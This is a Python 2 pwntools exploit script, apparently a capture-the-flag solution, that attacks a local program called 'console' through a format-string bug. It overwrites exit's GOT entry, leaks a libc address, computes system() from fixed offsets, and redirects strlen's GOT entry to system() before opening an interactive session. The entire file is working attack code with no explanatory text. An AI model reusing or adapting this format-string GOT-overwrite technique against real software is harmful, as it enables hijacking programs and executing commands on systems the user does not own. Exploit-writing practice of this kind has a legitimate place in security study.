
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'
# context.log_level= 'error'
EXIT_GOT = 0x0000000000601258
LOOP_ADDR = 0x00000000004009bd
STRLEN_GOT = 0x0000000000601210


def info(s):
	log.info(s)


def exploit(r):

	WRITE = ( LOOP_ADDR & 0xffff ) - 0x7 # LOW ADDRESS WRITE

	info('Write LOOP ADDR to EXiT')
	payload = "exit "
	payload += ("%%%du%%17$hn"%WRITE).rjust(19)
	payload += p64(EXIT_GOT)  # 64bit system
	r.sendline(payload)
	r.recvline()
	r.recv(100)

	info("GET LIBC ADDR")
	payload = "exit %p"
	r.sendline(payload)
	r.recvline()
	data = r.recv(100)
	LIBC_LEAK = int(data[:len('0x7fe720914683')],16)
	info("LIBC LEAK		: {}".format(hex(LIBC_LEAK)))
	LIBC = LIBC_LEAK - 0x39a683
	info("LIBC BASE		: {}".format(hex(LIBC)))
	EXEC_SYS_ADDR = LIBC + 0x000000000003f480
	info("SYSADDR		: {}".format(hex(EXEC_SYS_ADDR)))

	info('RESOLVE STRLEN')
	payload = "prompt ANYTHING"
	r.sendline(payload)
	r.recvline()

	info('WRITE ADDRESS OF SYS TO STRLEN_GOT')

	REDUCE  = 6
	WRITELO = (EXEC_SYS_ADDR & 0xffff) - REDUCE  # LOW ADDRESS WRITE
	WRITEHI = ((EXEC_SYS_ADDR & 0xffff0000) >> 16) - REDUCE  # HIGH ADDRESS WRITE


	payload = "exit "
	payload += ("%%%du%%17$hn" % WRITELO).rjust(19)
	payload += p64(STRLEN_GOT)  # 64bit system
	r.sendline(payload)
	r.recvline()
	r.recv(100)

	payload = "exit "
	payload += ("%%%du%%17$hn" % WRITEHI).rjust(19)
	payload += p64(STRLEN_GOT + 2)  # 64bit system
	r.sendline(payload)
	r.recvline()
	r.recv(100)

	r.interactive()
	return


if __name__ == '__main__':

	r = process(['./console','log'])
	print util.proc.pidof(r)
	pause()
	exploit(r)